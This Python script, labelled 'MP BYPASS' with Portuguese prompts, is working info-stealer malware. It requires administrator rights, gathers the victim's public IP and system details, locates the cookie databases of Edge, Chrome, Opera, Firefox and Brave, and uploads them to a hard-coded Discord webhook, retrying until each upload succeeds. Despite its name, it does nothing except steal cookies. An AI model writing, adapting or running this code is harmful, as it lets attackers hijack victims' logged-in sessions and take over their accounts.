import os
import getpass
import requests
import time
import platform
import psutil
import ctypes
import tkinter as tk
from tkinter import messagebox
import sys

APP_NAME = "MP BYPASS"
USER = getpass.getuser()
LINK_WEBHOOK = "https://discord.com/api/webhooks/1120751856893833427/NGbw6Ophwqp3GJue1iowNgLivDgu28mvV3423LKO4YzxPfec2ORlNvHujBtzWyGm-rXv"
DELAY_TIME = 4
STATUS_OK_DISCORD = 200
IP = "Nenhum."

def isOk():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not isOk():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo(APP_NAME, "Execute como administrador!")
    root.destroy()
    sys.exit()

def wait():
    time.sleep(DELAY_TIME)

def getIp():
    response = requests.get("http://ip-api.com/json")
    if response.status_code != 200:
        return "Nenhum."
    data = response.json()
    ip_publico = data["query"]
    return ip_publico

IP = getIp()

def getContent(info):
    mem = psutil.virtual_memory()
    total_ram = mem.total
    total_ram_gb = str(str(float("{:.2f}".format(total_ram / (1024 ** 3)))))

    PC = platform.uname()

    
    info_string = f"**💻 Produto**: *{info}*\n"
    info_string += f"**⚙ Processador**: {PC.processor}\n"
    info_string += f"**⚙ Sistema**: {PC.system}\n"
    info_string += f"**⚙ Arquitetura**: {PC.machine}\n"
    info_string += f"**⚙ Node Name**: {PC.node}\n"
    info_string += f"**⚙ Ram**: {total_ram_gb}GB\n"
    info_string += f"**⚙ Ip**: {IP}"

    return info_string


def collectCookieEdge():
    path = "C:/Users/" + USER + "/AppData/Local/Microsoft/Edge/User Data/Default/Network"
    if os.path.exists(path):
        return path
    return False

def collectCookieChrome():
    path = "C:/Users/" + USER + "/AppData/Local/Google/Chrome/User Data/Default/Network"
    if os.path.exists(path):
        return path
    return False

def collectCookieOpera():
    path = "C:/Users/" + USER + "/AppData/Roaming/Opera Software/Opera Stable/Network"
    if os.path.exists(path):
        return path
    return False

def collectCookieFirefox():
    path = "C:/Users/" + USER + "/AppData/Roaming/Mozilla/Firefox/Profiles"
    if os.path.exists(path):
        return path
    return False

def collectCookieBrave():
    path = "C:/Users/" + USER + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Network"
    if os.path.exists(path):
        return path
    return False

chrome = collectCookieChrome()
edge = collectCookieEdge()
opera = collectCookieOpera()
firefox = collectCookieFirefox()
brave = collectCookieBrave()


def sendEdge(WEBHOOK):
    FILE = edge + "/Cookies"
    files = {
        'file1': (FILE, open(FILE, 'rb'))
    }

    data = {
        "content": getContent("Navegador Edge.")
    }

    request = requests.post(WEBHOOK, data=data, files=files)
    return request.status_code

def sendChrome(WEBHOOK):
    FILE = chrome + "/Cookies"
    files = {
        'file': (FILE, open(FILE, 'rb'))
    }
    data = {
        "content": getContent("Navegador Chrome.")
    }

    request = requests.post(WEBHOOK, data=data, files=files)
    return request.status_code

def sendOpera(WEBHOOK):
    FILE = opera + "/Cookies"
    files = {
        'file': (FILE, open(FILE, 'rb'))
    }
    data = {
        "content": getContent("Navegador Opera.")
    }

    request = requests.post(WEBHOOK, data=data, files=files)
    return request.status_code

def sendFirefox(WEBHOOK):
    cookies_files = []
    for foldername in os.listdir(firefox):
        folder_path = os.path.join(firefox, foldername)


    if os.path.isdir(folder_path):
        
        for root, dirs, files in os.walk(folder_path):
            if 'cookies.sqlite' in files:
                cookies_path = os.path.join(root, 'cookies.sqlite')
                cookies_files.append(cookies_path.replace("\\","/"))
    
    files = {}
    for i, item in enumerate(cookies_files, start=1):
        key = 'file{}'.format(i)
        files[key] = (item, open(item, 'rb'))
    
    data = {
        "content": getContent("Navegador Firefox.")
    }
    print(files)
    request = requests.post(WEBHOOK, data=data, files=files)
    return request.status_code

def sendBrave(WEBHOOK):
    FILE = brave + "/Cookies"
    files = {
        'file': (FILE, open(FILE, 'rb'))
    }
    data = {
        "content": getContent("Navegador Brave.")
    }

    request = requests.post(WEBHOOK, data=data, files=files)
    return request.status_code

if edge != False:
    wait()
    senderStatus = sendEdge(LINK_WEBHOOK)
    while (senderStatus != STATUS_OK_DISCORD):
        wait()
        DELAY_TIME += 10
        senderStatus = sendEdge(LINK_WEBHOOK)



if chrome != False:
    wait()
    senderStatus = sendChrome(LINK_WEBHOOK)
    while (senderStatus != STATUS_OK_DISCORD):
        wait()
        DELAY_TIME += 10
        senderStatus = sendChrome(LINK_WEBHOOK)



if opera != False:
    wait()
    senderStatus = sendOpera(LINK_WEBHOOK)
    while (senderStatus != STATUS_OK_DISCORD):
        wait()
        DELAY_TIME += 10
        senderStatus = sendOpera(LINK_WEBHOOK)


    
if firefox != False:
    wait()
    senderStatus = sendFirefox(LINK_WEBHOOK)
    while (senderStatus != STATUS_OK_DISCORD):
        wait()
        DELAY_TIME += 10
        senderStatus = sendFirefox(LINK_WEBHOOK)



if brave != False:
    wait()
    senderStatus = sendBrave(LINK_WEBHOOK)
    while (senderStatus != STATUS_OK_DISCORD):
        wait()
        DELAY_TIME += 10
        senderStatus = sendBrave(LINK_WEBHOOK)



